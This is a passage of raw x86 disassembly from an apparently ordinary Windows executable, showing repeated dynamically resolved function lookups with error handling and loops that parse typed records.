  4033fd:	ff 15 6c 60 42 00    	call   *0x42606c
  403403:	a3 58 4b 43 00       	mov    %eax,0x434b58
  403408:	85 c0                	test   %eax,%eax
  40340a:	75 17                	jne    0x403423
  40340c:	68 c8 74 42 00       	push   $0x4274c8
  403411:	68 54 6a 42 00       	push   $0x426a54
  403416:	e8 65 e7 ff ff       	call   0x401b80
  40341b:	83 c4 08             	add    $0x8,%esp
  40341e:	83 c8 ff             	or     $0xffffffff,%eax
  403421:	5e                   	pop    %esi
  403422:	c3                   	ret
  403423:	68 f4 74 42 00       	push   $0x4274f4
  403428:	56                   	push   %esi
  403429:	ff 15 6c 60 42 00    	call   *0x42606c
  40342f:	a3 08 4b 43 00       	mov    %eax,0x434b08
  403434:	85 c0                	test   %eax,%eax
  403436:	75 17                	jne    0x40344f
  403438:	68 04 75 42 00       	push   $0x427504
  40343d:	68 54 6a 42 00       	push   $0x426a54
  403442:	e8 39 e7 ff ff       	call   0x401b80
  403447:	83 c4 08             	add    $0x8,%esp
  40344a:	83 c8 ff             	or     $0xffffffff,%eax
  40344d:	5e                   	pop    %esi
  40344e:	c3                   	ret
  40344f:	68 30 75 42 00       	push   $0x427530
  403454:	56                   	push   %esi
  403455:	ff 15 6c 60 42 00    	call   *0x42606c
  40345b:	a3 74 4b 43 00       	mov    %eax,0x434b74
  403460:	85 c0                	test   %eax,%eax
  403462:	75 17                	jne    0x40347b
  403464:	68 40 75 42 00       	push   $0x427540
  403469:	68 54 6a 42 00       	push   $0x426a54
  40346e:	e8 0d e7 ff ff       	call   0x401b80
  403473:	83 c4 08             	add    $0x8,%esp
  403476:	83 c8 ff             	or     $0xffffffff,%eax
  403479:	5e                   	pop    %esi
  40347a:	c3                   	ret
  40347b:	68 6c 75 42 00       	push   $0x42756c
  403480:	56                   	push   %esi
  403481:	ff 15 6c 60 42 00    	call   *0x42606c
  403487:	a3 78 4b 43 00       	mov    %eax,0x434b78
  40348c:	85 c0                	test   %eax,%eax
  40348e:	75 17                	jne    0x4034a7
  403490:	68 8c 75 42 00       	push   $0x42758c
  403495:	68 54 6a 42 00       	push   $0x426a54
  40349a:	e8 e1 e6 ff ff       	call   0x401b80
  40349f:	83 c4 08             	add    $0x8,%esp
  4034a2:	83 c8 ff             	or     $0xffffffff,%eax
  4034a5:	5e                   	pop    %esi
  4034a6:	c3                   	ret
  4034a7:	68 c8 75 42 00       	push   $0x4275c8
  4034ac:	56                   	push   %esi
  4034ad:	ff 15 6c 60 42 00    	call   *0x42606c
  4034b3:	a3 30 4b 43 00       	mov    %eax,0x434b30
  4034b8:	85 c0                	test   %eax,%eax
  4034ba:	75 17                	jne    0x4034d3
  4034bc:	68 e0 75 42 00       	push   $0x4275e0
  4034c1:	68 54 6a 42 00       	push   $0x426a54
  4034c6:	e8 b5 e6 ff ff       	call   0x401b80
  4034cb:	83 c4 08             	add    $0x8,%esp
  4034ce:	83 c8 ff             	or     $0xffffffff,%eax
  4034d1:	5e                   	pop    %esi
  4034d2:	c3                   	ret
  4034d3:	68 10 76 42 00       	push   $0x427610
  4034d8:	56                   	push   %esi
  4034d9:	ff 15 6c 60 42 00    	call   *0x42606c
  4034df:	a3 5c 4b 43 00       	mov    %eax,0x434b5c
  4034e4:	85 c0                	test   %eax,%eax
  4034e6:	75 17                	jne    0x4034ff
  4034e8:	68 20 76 42 00       	push   $0x427620
  4034ed:	68 54 6a 42 00       	push   $0x426a54
  4034f2:	e8 89 e6 ff ff       	call   0x401b80
  4034f7:	83 c4 08             	add    $0x8,%esp
  4034fa:	83 c8 ff             	or     $0xffffffff,%eax
  4034fd:	5e                   	pop    %esi
  4034fe:	c3                   	ret
  4034ff:	68 4c 76 42 00       	push   $0x42764c
  403504:	56                   	push   %esi
  403505:	ff 15 6c 60 42 00    	call   *0x42606c
  40350b:	a3 60 4b 43 00       	mov    %eax,0x434b60
  403510:	85 c0                	test   %eax,%eax
  403512:	75 17                	jne    0x40352b
  403514:	68 5c 76 42 00       	push   $0x42765c
  403519:	68 54 6a 42 00       	push   $0x426a54
  40351e:	e8 5d e6 ff ff       	call   0x401b80
  403523:	83 c4 08             	add    $0x8,%esp
  403526:	83 c8 ff             	or     $0xffffffff,%eax
  403529:	5e                   	pop    %esi
  40352a:	c3                   	ret
  40352b:	68 88 76 42 00       	push   $0x427688
  403530:	56                   	push   %esi
  403531:	ff 15 6c 60 42 00    	call   *0x42606c
  403537:	a3 68 4b 43 00       	mov    %eax,0x434b68
  40353c:	85 c0                	test   %eax,%eax
  40353e:	75 17                	jne    0x403557
  403540:	68 a0 76 42 00       	push   $0x4276a0
  403545:	68 54 6a 42 00       	push   $0x426a54
  40354a:	e8 31 e6 ff ff       	call   0x401b80
  40354f:	83 c4 08             	add    $0x8,%esp
  403552:	83 c8 ff             	or     $0xffffffff,%eax
  403555:	5e                   	pop    %esi
  403556:	c3                   	ret
  403557:	68 d0 76 42 00       	push   $0x4276d0
  40355c:	56                   	push   %esi
  40355d:	ff 15 6c 60 42 00    	call   *0x42606c
  403563:	a3 70 4b 43 00       	mov    %eax,0x434b70
  403568:	85 c0                	test   %eax,%eax
  40356a:	75 17                	jne    0x403583
  40356c:	68 e4 76 42 00       	push   $0x4276e4
  403571:	68 54 6a 42 00       	push   $0x426a54
  403576:	e8 05 e6 ff ff       	call   0x401b80
  40357b:	83 c4 08             	add    $0x8,%esp
  40357e:	83 c8 ff             	or     $0xffffffff,%eax
  403581:	5e                   	pop    %esi
  403582:	c3                   	ret
  403583:	68 10 77 42 00       	push   $0x427710
  403588:	56                   	push   %esi
  403589:	ff 15 6c 60 42 00    	call   *0x42606c
  40358f:	a3 6c 4b 43 00       	mov    %eax,0x434b6c
  403594:	85 c0                	test   %eax,%eax
  403596:	75 17                	jne    0x4035af
  403598:	68 2c 77 42 00       	push   $0x42772c
  40359d:	68 54 6a 42 00       	push   $0x426a54
  4035a2:	e8 d9 e5 ff ff       	call   0x401b80
  4035a7:	83 c4 08             	add    $0x8,%esp
  4035aa:	83 c8 ff             	or     $0xffffffff,%eax
  4035ad:	5e                   	pop    %esi
  4035ae:	c3                   	ret
  4035af:	68 64 77 42 00       	push   $0x427764
  4035b4:	56                   	push   %esi
  4035b5:	ff 15 6c 60 42 00    	call   *0x42606c
  4035bb:	a3 90 4b 43 00       	mov    %eax,0x434b90
  4035c0:	85 c0                	test   %eax,%eax
  4035c2:	75 17                	jne    0x4035db
  4035c4:	68 78 77 42 00       	push   $0x427778
  4035c9:	68 54 6a 42 00       	push   $0x426a54
  4035ce:	e8 ad e5 ff ff       	call   0x401b80
  4035d3:	83 c4 08             	add    $0x8,%esp
  4035d6:	83 c8 ff             	or     $0xffffffff,%eax
  4035d9:	5e                   	pop    %esi
  4035da:	c3                   	ret
  4035db:	68 a4 77 42 00       	push   $0x4277a4
  4035e0:	56                   	push   %esi
  4035e1:	ff 15 6c 60 42 00    	call   *0x42606c
  4035e7:	a3 94 4b 43 00       	mov    %eax,0x434b94
  4035ec:	85 c0                	test   %eax,%eax
  4035ee:	75 17                	jne    0x403607
  4035f0:	68 b4 77 42 00       	push   $0x4277b4
  4035f5:	68 54 6a 42 00       	push   $0x426a54
  4035fa:	e8 81 e5 ff ff       	call   0x401b80
  4035ff:	83 c4 08             	add    $0x8,%esp
  403602:	83 c8 ff             	or     $0xffffffff,%eax
  403605:	5e                   	pop    %esi
  403606:	c3                   	ret
  403607:	68 e0 77 42 00       	push   $0x4277e0
  40360c:	56                   	push   %esi
  40360d:	ff 15 6c 60 42 00    	call   *0x42606c
  403613:	a3 98 4b 43 00       	mov    %eax,0x434b98
  403618:	85 c0                	test   %eax,%eax
  40361a:	75 17                	jne    0x403633
  40361c:	68 f4 77 42 00       	push   $0x4277f4
  403621:	68 54 6a 42 00       	push   $0x426a54
  403626:	e8 55 e5 ff ff       	call   0x401b80
  40362b:	83 c4 08             	add    $0x8,%esp
  40362e:	83 c8 ff             	or     $0xffffffff,%eax
  403631:	5e                   	pop    %esi
  403632:	c3                   	ret
  403633:	33 c0                	xor    %eax,%eax
  403635:	5e                   	pop    %esi
  403636:	c3                   	ret
  403637:	cc                   	int3
  403638:	cc                   	int3
  403639:	cc                   	int3
  40363a:	cc                   	int3
  40363b:	cc                   	int3
  40363c:	cc                   	int3
  40363d:	cc                   	int3
  40363e:	cc                   	int3
  40363f:	cc                   	int3
  403640:	8b 44 24 04          	mov    0x4(%esp),%eax
  403644:	83 b8 74 50 00 00 01 	cmpl   $0x1,0x5074(%eax)
  40364b:	75 46                	jne    0x403693
  40364d:	56                   	push   %esi
  40364e:	8b 35 10 4b 43 00    	mov    0x434b10,%esi
  403654:	8b ce                	mov    %esi,%ecx
  403656:	6a 00                	push   $0x0
  403658:	68 a0 7b 42 00       	push   $0x427ba0
  40365d:	ff 15 8c 61 42 00    	call   *0x42618c
  403663:	ff d6                	call   *%esi
  403665:	8b 35 10 4b 43 00    	mov    0x434b10,%esi
  40366b:	83 c4 08             	add    $0x8,%esp
  40366e:	8b ce                	mov    %esi,%ecx
  403670:	6a 00                	push   $0x0
  403672:	68 38 7c 42 00       	push   $0x427c38
  403677:	ff 15 8c 61 42 00    	call   *0x42618c
  40367d:	ff d6                	call   *%esi
  40367f:	8b 35 ec 4a 43 00    	mov    0x434aec,%esi
  403685:	83 c4 08             	add    $0x8,%esp
  403688:	8b ce                	mov    %esi,%ecx
  40368a:	ff 15 8c 61 42 00    	call   *0x42618c
  403690:	ff d6                	call   *%esi
  403692:	5e                   	pop    %esi
  403693:	c3                   	ret
  403694:	cc                   	int3
  403695:	cc                   	int3
  403696:	cc                   	int3
  403697:	cc                   	int3
  403698:	cc                   	int3
  403699:	cc                   	int3
  40369a:	cc                   	int3
  40369b:	cc                   	int3
  40369c:	cc                   	int3
  40369d:	cc                   	int3
  40369e:	cc                   	int3
  40369f:	cc                   	int3
  4036a0:	51                   	push   %ecx
  4036a1:	55                   	push   %ebp
  4036a2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  4036a6:	56                   	push   %esi
  4036a7:	8d 95 70 40 00 00    	lea    0x4070(%ebp),%edx
  4036ad:	8b ca                	mov    %edx,%ecx
  4036af:	8d 71 01             	lea    0x1(%ecx),%esi
  4036b2:	8a 01                	mov    (%ecx),%al
  4036b4:	41                   	inc    %ecx
  4036b5:	84 c0                	test   %al,%al
  4036b7:	75 f9                	jne    0x4036b2
  4036b9:	68 e4 7a 42 00       	push   $0x427ae4
  4036be:	2b ce                	sub    %esi,%ecx
  4036c0:	8b 35 70 4b 43 00    	mov    0x434b70,%esi
  4036c6:	68 ec 7a 42 00       	push   $0x427aec
  4036cb:	51                   	push   %ecx
  4036cc:	52                   	push   %edx
  4036cd:	8b ce                	mov    %esi,%ecx
  4036cf:	ff 15 8c 61 42 00    	call   *0x42618c
  4036d5:	ff d6                	call   *%esi
  4036d7:	83 c4 10             	add    $0x10,%esp
  4036da:	85 c0                	test   %eax,%eax
  4036dc:	75 14                	jne    0x4036f2
  4036de:	68 f4 7a 42 00       	push   $0x427af4
  4036e3:	e8 68 e4 ff ff       	call   0x401b50
  4036e8:	83 c4 04             	add    $0x4,%esp
  4036eb:	83 c8 ff             	or     $0xffffffff,%eax
  4036ee:	5e                   	pop    %esi
  4036ef:	5d                   	pop    %ebp
  4036f0:	59                   	pop    %ecx
  4036f1:	c3                   	ret
  4036f2:	8b 35 58 4b 43 00    	mov    0x434b58,%esi
  4036f8:	8b ce                	mov    %esi,%ecx
  4036fa:	57                   	push   %edi
  4036fb:	50                   	push   %eax
  4036fc:	68 1c 7b 42 00       	push   $0x427b1c
  403701:	ff 15 8c 61 42 00    	call   *0x42618c
  403707:	ff d6                	call   *%esi
  403709:	8b 7d 10             	mov    0x10(%ebp),%edi
  40370c:	83 c4 08             	add    $0x8,%esp
  40370f:	3b 7d 14             	cmp    0x14(%ebp),%edi
  403712:	0f 83 c0 00 00 00    	jae    0x4037d8
  403718:	53                   	push   %ebx
  403719:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403720:	8a 47 11             	mov    0x11(%edi),%al
  403723:	3c 6d                	cmp    $0x6d,%al
  403725:	74 08                	je     0x40372f
  403727:	3c 4d                	cmp    $0x4d,%al
  403729:	0f 85 93 00 00 00    	jne    0x4037c2
  40372f:	57                   	push   %edi
  403730:	55                   	push   %ebp
  403731:	e8 6a db ff ff       	call   0x4012a0
  403736:	8b 35 78 4b 43 00    	mov    0x434b78,%esi
  40373c:	83 c4 08             	add    $0x8,%esp
  40373f:	8b ce                	mov    %esi,%ecx
  403741:	89 44 24 10          	mov    %eax,0x10(%esp)
  403745:	ff 77 0c             	push   0xc(%edi)
  403748:	50                   	push   %eax
  403749:	ff 15 8c 61 42 00    	call   *0x42618c
  40374f:	ff d6                	call   *%esi
  403751:	83 c4 08             	add    $0x8,%esp
  403754:	8d 5f 12             	lea    0x12(%edi),%ebx
  403757:	85 c0                	test   %eax,%eax
  403759:	74 19                	je     0x403774
  40375b:	8b 35 14 4b 43 00    	mov    0x434b14,%esi
  403761:	8b ce                	mov    %esi,%ecx
  403763:	50                   	push   %eax
  403764:	53                   	push   %ebx
  403765:	ff 15 8c 61 42 00    	call   *0x42618c
  40376b:	ff d6                	call   *%esi
  40376d:	83 c4 08             	add    $0x8,%esp
  403770:	85 c0                	test   %eax,%eax
  403772:	75 0e                	jne    0x403782
  403774:	53                   	push   %ebx
  403775:	68 28 7b 42 00       	push   $0x427b28
  40377a:	e8 d1 e3 ff ff       	call   0x401b50
  40377f:	83 c4 08             	add    $0x8,%esp
  403782:	8b 35 48 4b 43 00    	mov    0x434b48,%esi
  403788:	8b ce                	mov    %esi,%ecx
  40378a:	ff 15 8c 61 42 00    	call   *0x42618c
  403790:	ff d6                	call   *%esi
  403792:	85 c0                	test   %eax,%eax
  403794:	74 20                	je     0x4037b6
  403796:	8b 35 4c 4b 43 00    	mov    0x434b4c,%esi
  40379c:	8b ce                	mov    %esi,%ecx
  40379e:	ff 15 8c 61 42 00    	call   *0x42618c
  4037a4:	ff d6                	call   *%esi
  4037a6:	8b 35 44 4b 43 00    	mov    0x434b44,%esi
  4037ac:	8b ce                	mov    %esi,%ecx
  4037ae:	ff 15 8c 61 42 00    	call   *0x42618c
  4037b4:	ff d6                	call   *%esi
  4037b6:	ff 74 24 10          	push   0x10(%esp)
  4037ba:	e8 89 e3 00 00       	call   0x411b48
  4037bf:	83 c4 04             	add    $0x4,%esp
  4037c2:	57                   	push   %edi
  4037c3:	55                   	push   %ebp
  4037c4:	e8 57 df ff ff       	call   0x401720
  4037c9:	8b f8                	mov    %eax,%edi
  4037cb:	83 c4 08             	add    $0x8,%esp
  4037ce:	3b 7d 14             	cmp    0x14(%ebp),%edi
  4037d1:	0f 82 49 ff ff ff    	jb     0x403720
  4037d7:	5b                   	pop    %ebx
  4037d8:	5f                   	pop    %edi
  4037d9:	5e                   	pop    %esi
  4037da:	33 c0                	xor    %eax,%eax
  4037dc:	5d                   	pop    %ebp
  4037dd:	59                   	pop    %ecx
  4037de:	c3                   	ret
  4037df:	cc                   	int3
  4037e0:	83 ec 08             	sub    $0x8,%esp
  4037e3:	53                   	push   %ebx
  4037e4:	55                   	push   %ebp
  4037e5:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4037e9:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4037ec:	3b 5d 14             	cmp    0x14(%ebp),%ebx
  4037ef:	0f 83 12 01 00 00    	jae    0x403907
  4037f5:	56                   	push   %esi
  4037f6:	57                   	push   %edi
  4037f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4037fe:	00 00 
  403800:	80 7b 11 7a          	cmpb   $0x7a,0x11(%ebx)
  403804:	0f 85 e6 00 00 00    	jne    0x4038f0
  40380a:	8b 43 04             	mov    0x4(%ebx),%eax
  40380d:	8d 55 70             	lea    0x70(%ebp),%edx
  403810:	33 c9                	xor    %ecx,%ecx
  403812:	03 45 08             	add    0x8(%ebp),%eax
  403815:	89 44 24 14          	mov    %eax,0x14(%esp)
  403819:	8b c2                	mov    %edx,%eax
  40381b:	13 4d 0c             	adc    0xc(%ebp),%ecx
  40381e:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403822:	8d 70 01             	lea    0x1(%eax),%esi
  403825:	8a 08                	mov    (%eax),%cl
  403827:	40                   	inc    %eax
  403828:	84 c9                	test   %cl,%cl
  40382a:	75 f9                	jne    0x403825
  40382c:	68 e4 7a 42 00       	push   $0x427ae4
  403831:	2b c6                	sub    %esi,%eax
  403833:	8b 35 70 4b 43 00    	mov    0x434b70,%esi
  403839:	68 ec 7a 42 00       	push   $0x427aec
  40383e:	50                   	push   %eax
  40383f:	52                   	push   %edx
  403840:	8b ce                	mov    %esi,%ecx
  403842:	ff 15 8c 61 42 00    	call   *0x42618c
  403848:	ff d6                	call   *%esi
  40384a:	8b 35 68 4b 43 00    	mov    0x434b68,%esi
  403850:	83 c4 10             	add    $0x10,%esp
  403853:	8b f8                	mov    %eax,%edi
  403855:	8b ce                	mov    %esi,%ecx
  403857:	ff 74 24 10          	push   0x10(%esp)
  40385b:	ff 74 24 18          	push   0x18(%esp)
  40385f:	57                   	push   %edi
  403860:	68 48 7b 42 00       	push   $0x427b48
  403865:	ff 15 8c 61 42 00    	call   *0x42618c
  40386b:	ff d6                	call   *%esi
  40386d:	8b 35 f4 4a 43 00    	mov    0x434af4,%esi
  403873:	83 c4 10             	add    $0x10,%esp
  403876:	8b ce                	mov    %esi,%ecx
  403878:	89 44 24 10          	mov    %eax,0x10(%esp)
  40387c:	57                   	push   %edi
  40387d:	ff 15 8c 61 42 00    	call   *0x42618c
  403883:	ff d6                	call   *%esi
  403885:	8b 35 64 4b 43 00    	mov    0x434b64,%esi
  40388b:	83 c4 04             	add    $0x4,%esp
  40388e:	8b ce                	mov    %esi,%ecx
  403890:	68 50 7b 42 00       	push   $0x427b50
  403895:	ff 15 8c 61 42 00    	call   *0x42618c
  40389b:	ff d6                	call   *%esi
  40389d:	83 c4 04             	add    $0x4,%esp
  4038a0:	85 c0                	test   %eax,%eax
  4038a2:	75 23                	jne    0x4038c7
  4038a4:	68 58 7b 42 00       	push   $0x427b58
  4038a9:	e8 a2 e2 ff ff       	call   0x401b50
  4038ae:	8b 35 f4 4a 43 00    	mov    0x434af4,%esi
  4038b4:	83 c4 04             	add    $0x4,%esp
  4038b7:	8b ce                	mov    %esi,%ecx
  4038b9:	ff 74 24 10          	push   0x10(%esp)
  4038bd:	ff 15 8c 61 42 00    	call   *0x42618c
  4038c3:	ff d6                	call   *%esi
  4038c5:	eb 26                	jmp    0x4038ed
  4038c7:	ff 74 24 10          	push   0x10(%esp)
  4038cb:	8b 35 28 4b 43 00    	mov    0x434b28,%esi
  4038d1:	8b ce                	mov    %esi,%ecx
  4038d3:	50                   	push   %eax
  4038d4:	ff 15 8c 61 42 00    	call   *0x42618c
  4038da:	ff d6                	call   *%esi
  4038dc:	83 c4 08             	add    $0x8,%esp
  4038df:	85 c0                	test   %eax,%eax
  4038e1:	74 0d                	je     0x4038f0
  4038e3:	68 80 7b 42 00       	push   $0x427b80
  4038e8:	e8 63 e2 ff ff       	call   0x401b50
  4038ed:	83 c4 04             	add    $0x4,%esp
  4038f0:	53                   	push   %ebx
  4038f1:	55                   	push   %ebp
  4038f2:	e8 29 de ff ff       	call   0x401720
  4038f7:	8b d8                	mov    %eax,%ebx
  4038f9:	83 c4 08             	add    $0x8,%esp
  4038fc:	3b 5d 14             	cmp    0x14(%ebp),%ebx
  4038ff:	0f 82 fb fe ff ff    	jb     0x403800
  403905:	5f                   	pop    %edi
  403906:	5e                   	pop    %esi
  403907:	5d                   	pop    %ebp
  403908:	33 c0                	xor    %eax,%eax
  40390a:	5b                   	pop    %ebx
  40390b:	83 c4 08             	add    $0x8,%esp
  40390e:	c3                   	ret
  40390f:	cc                   	int3
  403910:	b8 44 20 00 00       	mov    $0x2044,%eax
  403915:	e8 06 5f 00 00       	call   0x409820
  40391a:	a1 08 40 43 00       	mov    0x434008,%eax
  40391f:	33 c4                	xor    %esp,%eax
  403921:	89 84 24 40 20 00 00 	mov    %eax,0x2040(%esp)
  403928:	56                   	push   %esi
  403929:	8b b4 24 4c 20 00 00 	mov    0x204c(%esp),%esi
  403930:	8d 44 24 04          	lea    0x4(%esp),%eax
  403934:	57                   	push   %edi
  403935:	8d 7e 30             	lea    0x30(%esi),%edi
  403938:	57                   	push   %edi
  403939:	68 bc 66 42 00       	push   $0x4266bc
  40393e:	6a 40                	push   $0x40
  403940:	50                   	push   %eax
  403941:	e8 5a e1 ff ff       	call   0x401aa0
  403946:	83 c4 10             	add    $0x10,%esp
  403949:	83 f8 40             	cmp    $0x40,%eax
  40394c:	72 2b                	jb     0x403979
  40394e:	6a 40                	push   $0x40
  403950:	57                   	push   %edi
  403951:	50                   	push   %eax
  403952:	68 28 78 42 00       	push   $0x427828
  403957:	e8 f4 e1 ff ff       	call   0x401b50
  40395c:	83 c4 10             	add    $0x10,%esp
  40395f:	83 c8 ff             	or     $0xffffffff,%eax
  403962:	5f                   	pop    %edi
  403963:	5e                   	pop    %esi
  403964:	8b 8c 24 40 20 00 00 	mov    0x2040(%esp),%ecx
  40396b:	33 cc                	xor    %esp,%ecx
  40396d:	e8 95 5e 00 00       	call   0x409807
  403972:	81 c4 44 20 00 00    	add    $0x2044,%esp
  403978:	c3                   	ret
  403979:	83 be 70 50 00 00 00 	cmpl   $0x0,0x5070(%esi)
  403980:	74 4e                	je     0x4039d0
  403982:	68 70 78 42 00       	push   $0x427870
  403987:	8d be 70 30 00 00    	lea    0x3070(%esi),%edi
  40398d:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  403991:	57                   	push   %edi
  403992:	50                   	push   %eax
  403993:	e8 78 f2 ff ff       	call   0x402c10
  403998:	83 c4 0c             	add    $0xc,%esp
  40399b:	85 c0                	test   %eax,%eax
  40399d:	75 13                	jne    0x4039b2
  40399f:	68 00 10 00 00       	push   $0x1000
  4039a4:	57                   	push   %edi
  4039a5:	68 80 78 42 00       	push   $0x427880
  4039aa:	e8 a1 e1 ff ff       	call   0x401b50
  4039af:	83 c4 0c             	add    $0xc,%esp
  4039b2:	8d 44 24 48          	lea    0x48(%esp),%eax
  4039b6:	50                   	push   %eax
  4039b7:	e8 84 f1 ff ff       	call   0x402b40
  4039bc:	83 c4 04             	add    $0x4,%esp
  4039bf:	85 c0                	test   %eax,%eax
  4039c1:	74 0d                	je     0x4039d0
  4039c3:	8d 44 24 48          	lea    0x48(%esp),%eax
  4039c7:	50                   	push   %eax
  4039c8:	e8 b3 25 00 00       	call   0x405f80
  4039cd:	83 c4 04             	add    $0x4,%esp
  4039d0:	8d 44 24 08          	lea    0x8(%esp),%eax
  4039d4:	81 c6 70 40 00 00    	add    $0x4070,%esi
  4039da:	50                   	push   %eax
  4039db:	8d 84 24 4c 10 00 00 	lea    0x104c(%esp),%eax
  4039e2:	56                   	push   %esi
  4039e3:	50                   	push   %eax
  4039e4:	e8 27 f2 ff ff       	call   0x402c10
  4039e9:	83 c4 0c             	add    $0xc,%esp
  4039ec:	85 c0                	test   %eax,%eax
  4039ee:	75 13                	jne    0x403a03
  4039f0:	68 00 10 00 00       	push   $0x1000
  4039f5:	56                   	push   %esi
  4039f6:	68 bc 78 42 00       	push   $0x4278bc
  4039fb:	e8 50 e1 ff ff       	call   0x401b50
  403a00:	83 c4 0c             	add    $0xc,%esp
  403a03:	8d 84 24 48 10 00 00 	lea    0x1048(%esp),%eax
  403a0a:	50                   	push   %eax
  403a0b:	e8 70 25 00 00       	call   0x405f80
  403a10:	83 c4 04             	add    $0x4,%esp
  403a13:	85 c0                	test   %eax,%eax
  403a15:	75 34                	jne    0x403a4b
  403a17:	8d 84 24 48 10 00 00 	lea    0x1048(%esp),%eax
  403a1e:	50                   	push   %eax
  403a1f:	68 f0 78 42 00       	push   $0x4278f0
  403a24:	68 10 79 42 00       	push   $0x427910
  403a29:	e8 52 e1 ff ff       	call   0x401b80
  403a2e:	83 c4 0c             	add    $0xc,%esp
  403a31:	83 c8 ff             	or     $0xffffffff,%eax
  403a34:	5f                   	pop    %edi
  403a35:	5e                   	pop    %esi
  403a36:	8b 8c 24 40 20 00 00 	mov    0x2040(%esp),%ecx
  403a3d:	33 cc                	xor    %esp,%ecx
  403a3f:	e8 c3 5d 00 00       	call   0x409807
  403a44:	81 c4 44 20 00 00    	add    $0x2044,%esp
  403a4a:	c3                   	ret
  403a4b:	ff 35 bc 4a 43 00    	push   0x434abc
  403a51:	50                   	push   %eax
  403a52:	e8 59 f2 ff ff       	call   0x402cb0
  403a57:	8b 8c 24 50 20 00 00 	mov    0x2050(%esp),%ecx
  403a5e:	83 c4 08             	add    $0x8,%esp
  403a61:	5f                   	pop    %edi
  403a62:	5e                   	pop    %esi
  403a63:	33 cc                	xor    %esp,%ecx
  403a65:	e8 9d 5d 00 00       	call   0x409807
  403a6a:	81 c4 44 20 00 00    	add    $0x2044,%esp
  403a70:	c3                   	ret
  403a71:	cc                   	int3
  403a72:	cc                   	int3
  403a73:	cc                   	int3
  403a74:	cc                   	int3
  403a75:	cc                   	int3
  403a76:	cc                   	int3
  403a77:	cc                   	int3
  403a78:	cc                   	int3
  403a79:	cc                   	int3
  403a7a:	cc                   	int3
  403a7b:	cc                   	int3
  403a7c:	cc                   	int3
  403a7d:	cc                   	int3
  403a7e:	cc                   	int3
  403a7f:	cc                   	int3
  403a80:	b8 08 20 00 00       	mov    $0x2008,%eax
  403a85:	e8 96 5d 00 00       	call   0x409820
  403a8a:	a1 08 40 43 00       	mov    0x434008,%eax
  403a8f:	33 c4                	xor    %esp,%eax
  403a91:	89 84 24 04 20 00 00 	mov    %eax,0x2004(%esp)
  403a98:	a1 c4 4a 43 00       	mov    0x434ac4,%eax
  403a9d:	53                   	push   %ebx
  403a9e:	8b 9c 24 10 20 00 00 	mov    0x2010(%esp),%ebx
  403aa5:	55                   	push   %ebp
  403aa6:	56                   	push   %esi
  403aa7:	57                   	push   %edi
  403aa8:	8b 7b 10             	mov    0x10(%ebx),%edi
  403aab:	33 ed                	xor    %ebp,%ebp
  403aad:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403ab3:	a1 c0 4a 43 00       	mov    0x434ac0,%eax
  403ab8:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403abe:	a1 d8 4a 43 00       	mov    0x434ad8,%eax
  403ac3:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403ac9:	a1 dc 4a 43 00       	mov    0x434adc,%eax
  403ace:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403ad4:	a1 d4 4a 43 00       	mov    0x434ad4,%eax
  403ad9:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403adf:	a1 d0 4a 43 00       	mov    0x434ad0,%eax
  403ae4:	89 28                	mov    %ebp,(%eax)
  403ae6:	3b 7b 14             	cmp    0x14(%ebx),%edi
  403ae9:	0f 83 4a 01 00 00    	jae    0x403c39
  403aef:	90                   	nop
  403af0:	80 7f 11 6f          	cmpb   $0x6f,0x11(%edi)
  403af4:	0f 85 82 00 00 00    	jne    0x403b7c
  403afa:	6a 04                	push   $0x4
  403afc:	8d 77 12             	lea    0x12(%edi),%esi
  403aff:	68 1c 79 42 00       	push   $0x42791c
  403b04:	56                   	push   %esi
  403b05:	e8 66 e0 00 00       	call   0x411b70
  403b0a:	83 c4 0c             	add    $0xc,%esp
  403b0d:	85 c0                	test   %eax,%eax
  403b0f:	74 6b                	je     0x403b7c
  403b11:	0f be 06             	movsbl (%esi),%eax
  403b14:	83 c0 b1             	add    $0xffffffb1,%eax
  403b17:	83 f8 27             	cmp    $0x27,%eax
  403b1a:	77 60                	ja     0x403b7c
  403b1c:	0f b6 80 7c 3c 40 00 	movzbl 0x403c7c(%eax),%eax
  403b23:	ff 24 85 68 3c 40 00 	jmp    *0x403c68(,%eax,4)
  403b2a:	a1 d0 4a 43 00       	mov    0x434ad0,%eax
  403b2f:	eb 45                	jmp    0x403b76
  403b31:	bd 01 00 00 00       	mov    $0x1,%ebp
  403b36:	eb 44                	jmp    0x403b7c
  403b38:	68 00 10 00 00       	push   $0x1000
  403b3d:	8d 77 14             	lea    0x14(%edi),%esi
  403b40:	8d 44 24 14          	lea    0x14(%esp),%eax
  403b44:	56                   	push   %esi
  403b45:	50                   	push   %eax
  403b46:	e8 bf f3 00 00       	call   0x412f0a
  403b4b:	83 c4 0c             	add    $0xc,%esp
  403b4e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b51:	0f 84 fd 00 00 00    	je     0x403c54
  403b57:	8b 35 50 4b 43 00    	mov    0x434b50,%esi
  403b5d:	8d 44 24 10          	lea    0x10(%esp),%eax
  403b61:	50                   	push   %eax
  403b62:	8b ce                	mov    %esi,%ecx
  403b64:	ff 15 8c 61 42 00    	call   *0x42618c
  403b6a:	ff d6                	call   *%esi
  403b6c:	83 c4 04             	add    $0x4,%esp
  403b6f:	eb 0b                	jmp    0x403b7c
  403b71:	a1 c8 4a 43 00       	mov    0x434ac8,%eax
  403b76:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403b7c:	57                   	push   %edi
  403b7d:	53                   	push   %ebx
  403b7e:	e8 9d db ff ff       	call   0x401720
  403b83:	8b f8                	mov    %eax,%edi
  403b85:	83 c4 08             	add    $0x8,%esp
  403b88:	3b 7b 14             	cmp    0x14(%ebx),%edi
  403b8b:	0f 82 5f ff ff ff    	jb     0x403af0
  403b91:	85 ed                	test   %ebp,%ebp
  403b93:	0f 84 a0 00 00 00    	je     0x403c39
  403b99:	68 00 80 00 00       	push   $0x8000
  403b9e:	6a 00                	push   $0x0
